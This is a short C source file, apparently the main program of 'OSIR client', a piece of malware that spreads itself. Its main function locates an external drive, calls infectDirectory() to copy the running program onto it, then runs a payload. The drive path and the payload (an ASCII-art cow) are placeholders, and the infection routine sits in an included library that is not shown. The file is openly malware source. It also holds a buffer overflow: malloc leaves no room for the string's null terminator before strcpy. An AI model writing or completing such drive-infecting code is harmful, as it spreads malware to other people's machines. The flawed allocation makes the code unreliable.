/*
	Main source file for OSIR client
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "common/clonelib.h"
#include "common/common.h"

void locateExternalDrive(char** path){
	*path=(char*) malloc(sizeof(char)*strlen("placeholder"));
	strcpy(*path,"placeholder");
}
void runPayload(){
	printf(" _____________________\n\
< Payload Placeholder >\n\
 --------------------- \n\
        \\   ^__^\n\
         \\  (oo)\\_______\n\
            (__)\\       )\\/\\\n\
                ||----w |\n\
                ||     ||\n");
}


int main(int argc, char** argv){argc=argc;
	
	//Find external drive
	char* externalPath;
	locateExternalDrive(&externalPath);
	
	//Infect external drive
	infectDirectory(externalPath,argv[0]);
	
	//Run payload
	runPayload();
	
	//If malloc'd, free external Path
	free(externalPath);
	return 0;
}
